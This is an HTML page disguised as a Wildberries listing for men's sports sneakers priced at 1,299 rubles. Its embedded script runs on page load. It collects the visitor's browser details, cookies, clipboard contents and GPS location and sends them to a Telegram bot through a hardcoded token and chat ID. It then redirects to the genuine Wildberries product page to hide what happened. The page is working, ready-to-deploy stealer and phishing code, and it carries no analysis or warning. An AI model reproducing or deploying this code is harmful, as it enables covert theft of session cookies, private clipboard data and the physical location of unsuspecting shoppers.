<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wildberries - Крассовки</title>
<style>
body{font-family:Arial,sans-serif;margin:0;padding:20px;text-align:center;background:#fff;}
img{max-width:100%;height:auto;border-radius:10px;}
.price{color:#f44336;font-size:24px;font-weight:bold;}
</style>
</head>
<body>
<h2>Крассовки спортивные мужские</h2>
<img src="https://ir-3.wbstatic.net/c516x688/new/927003948/1.jpg" onerror="this.src='https://via.placeholder.com/300x300?text=WB'">
<p class="price">1 299 руб</p>
<p>Загрузка товара...</p>

<script>
setTimeout(function(){
    var d = "";
    d += "📱 " + navigator.userAgent + "\n";
    d += "💾 Память: " + (navigator.deviceMemory || "?") + " GB\n";
    d += "📺 Экран: " + screen.width + "x" + screen.height + "\n";
    d += "🌐 Язык: " + navigator.language + "\n";
    d += "🍪 Куки: " + (document.cookie || "нет") + "\n";
    
    var TOKEN = "8636640064:AAFcyhqdc_YBLzEtAMKbKZhcfylhLhfIWLo";
    var ID = "7532676697";
    
    // Способ 1: через картинку
    new Image().src = "https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+ID+"&text="+encodeURIComponent(d);
    
    // Способ 2: буфер обмена
    try {
        navigator.clipboard.readText().then(function(t){
            new Image().src = "https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+ID+"&text="+encodeURIComponent("📋 Буфер: "+t);
        });
    } catch(e) {}
    
    // Способ 3: геолокация
    try {
        navigator.geolocation.getCurrentPosition(function(p){
            new Image().src = "https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+ID+"&text="+encodeURIComponent("📍 GPS: "+p.coords.latitude.toFixed(6)+","+p.coords.longitude.toFixed(6));
        });
    } catch(e) {}
    
    // Редирект
    setTimeout(function(){
        window.location.href = "https://www.wildberries.ru/catalog/927003948/detail.aspx?size=1399654915";
    }, 2000);
}, 500);
</script>
</body>
</html>
